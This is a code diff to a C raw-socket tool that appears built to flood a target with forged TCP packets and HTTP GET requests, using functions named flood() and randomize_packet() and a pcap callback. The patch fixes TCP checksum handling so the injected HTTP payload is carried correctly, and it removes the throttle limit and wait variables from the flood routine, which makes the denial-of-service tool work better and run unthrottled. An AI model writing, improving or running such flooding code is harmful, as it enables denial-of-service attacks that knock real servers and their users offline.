@@ -116,9 +116,9 @@ unsigned short ip_csum (unsigned short *buf, int nwords) {
 /* This piece of code has been used many times in a lot of differents tools. */
 /* I haven't been able to determine the author of the code but it looks like */
 /* this is a public domain implementation of the checksum algorithm */
-unsigned short tcp_csum (unsigned short *addr, int len) {
+unsigned short tcp_csum (unsigned short *addr, int len, unsigned short sum_start) {
     
-	register int sum = 0;
+	register int sum = sum_start;
 	u_short answer = 0;
 	register u_short *w = addr;
 	register int nleft = len;
@@ -168,7 +168,7 @@ void randomize_packet (struct tcphdr *tcph, tcp_phdr_t pseudohdr) {
 	memcpy (tcpcsumblock + sizeof(tcp_phdr_t), tcph, sizeof(struct tcphdr));
 	tcph->check = tcp_csum (
 				(unsigned short *)(tcpcsumblock), 
-				sizeof (tcp_phdr_t) + sizeof (struct tcphdr)
+				sizeof (tcp_phdr_t) + sizeof (struct tcphdr), 0
 			);
 }
 
@@ -191,8 +191,6 @@ int flood (int count, in_addr_t s_addr, in_addr_t d_addr, int port) {
 	const int *val = &one;
 	
 	int throttle_counter = 0;
-	int throttle_limit = 100;
-	int throttle_wait = 1;
 	
 	int s = socket (PF_INET, SOCK_RAW, IPPROTO_TCP);
 	
@@ -354,7 +352,7 @@ void got_packet (u_char *args, const struct pcap_pkthdr *header, const u_char *p
 	memcpy (tcpcsumblock, &pseudohdr, sizeof (pseudohdr));
 	memcpy (tcpcsumblock + sizeof(pseudohdr), tcph, sizeof(*tcph));
 	
-	tcph->check = tcp_csum ((unsigned short *)(tcpcsumblock), sizeof (pseudohdr) + sizeof (*tcph));
+	tcph->check = tcp_csum ((unsigned short *)(tcpcsumblock), sizeof (pseudohdr) + sizeof (*tcph), 0);
 	iph->check = ip_csum ((unsigned short *) datagram, iph->tot_len >> 1);
 	
 	// send
@@ -367,18 +365,22 @@ void got_packet (u_char *args, const struct pcap_pkthdr *header, const u_char *p
 		printf (".");
 	
 	if (send_get != 0) {
+		int request_len = strlen(request);
+		
 		// send an HTTP GET request here
 		tcph->psh = 1;
 		tcph->check = 0;
+		pseudohdr.tcplen = htons( sizeof(struct tcphdr) + request_len);
 		
-		memcpy (datagram + sizeof (*iph) + sizeof (*tcph), request, strlen (request));
+		memcpy (datagram + sizeof (*iph) + sizeof (*tcph), request, request_len);
 		memcpy (tcpcsumblock, &pseudohdr, sizeof (pseudohdr));
 		memcpy (tcpcsumblock + sizeof(pseudohdr), tcph, sizeof(*tcph));
 		
-		tcph->check = tcp_csum ((unsigned short *)(tcpcsumblock), sizeof (pseudohdr) + sizeof (*tcph));
+		tcph->check = tcp_csum ((unsigned short *)(tcpcsumblock), sizeof (pseudohdr) + sizeof (*tcph), 0);
+		tcph->check = tcp_csum((unsigned short *)request, request_len, ~tcph->check);
 		iph->check = ip_csum ((unsigned short *) datagram, iph->tot_len >> 1);
 		
-		result_s = sendto (s, datagram, sizeof (*iph) + sizeof (*tcph) + strlen (request), 0, (struct sockaddr *) &sin, sizeof (sin));
+		result_s = sendto (s, datagram, sizeof (*iph) + sizeof (*tcph) + request_len, 0, (struct sockaddr *) &sin, sizeof (sin));
 		if (result_s < 0)
 			printf ("sendto error: %d\n", result_s);
 		else
